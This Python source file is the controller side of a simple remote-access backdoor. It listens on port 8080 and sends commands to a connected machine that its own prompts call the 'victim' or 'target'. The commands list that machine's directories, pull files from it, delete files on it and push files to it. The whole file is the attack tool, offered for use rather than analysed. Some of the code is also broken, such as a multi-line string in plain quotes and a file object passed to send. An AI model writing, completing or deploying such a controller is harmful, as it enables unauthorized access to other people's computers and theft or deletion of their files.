import os
import socket
s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host,port))
print("")
print(" Server is curretly running @ : ",host)
print("")
print(" Waiting for any incoming Connections...")
s.listen(1)
conn , addr = s.accept()
print("")
print(addr, "Has connected to the server successfully ")
while 1:
  command = input(str("Command>> "))
  if command == "file":
    conn.send(command.encode())
    files = conn.recv(1024)
    files = files.decode()
    print(files)
  elif command == "clear":
    os.system("clear")
  elif command == "dir":
     conn.send(command.encode())
     i = input("Custom dir : ")
     conn.send(i.encode())
     files = conn.recv(1024)
     files = files.decode()
     print(files)
  elif command == "move":
     conn.send(command.encode())
     filename = input(str("file : "))
     conn.send(filename.encode())
     print("Done..")
     file = conn.recv(10000)
     filepath = input(str("Enter Filename : "))
     new_file = open(filepath, "wb")
     new_file.write(file)
     new_file.close()
     print(filepath, "Done Move succesfully")
  elif command == "remove":
     conn.send(command.encode())
     fileanddir = input(str("Enter filename remove : "))
     conn.send(fileanddir.encode())
     print("Done.. Remove")
  elif command == "send":
     conn.send(command.encode())
     filer = input(str("Enter location file : "))
     filepor = input(str("Enter Filename send : "))
     date = open(filer, "rb")
     file_date = date.read(7000)
     conn.send(file_date)
     conn.send(date)
     print(filer, "Has been sent victem succesfully")
     conn.send(filepor.encode())
  elif command == "open":
     conn.send(command.encode())
     open = input(str("Enter a open folder : "))
     conn.send(open.encode())
     print("Done..")
  elif command == "ls":
     os.system("ls")
  elif command == "help":
    print("Commands : 
        file : show Place
        clear : remove screen
        dir : show dir
        move : give file from Target or Victim
        remove : Delete file of Target or Victim
        send : send file from Device Your and send of Target or Victim")
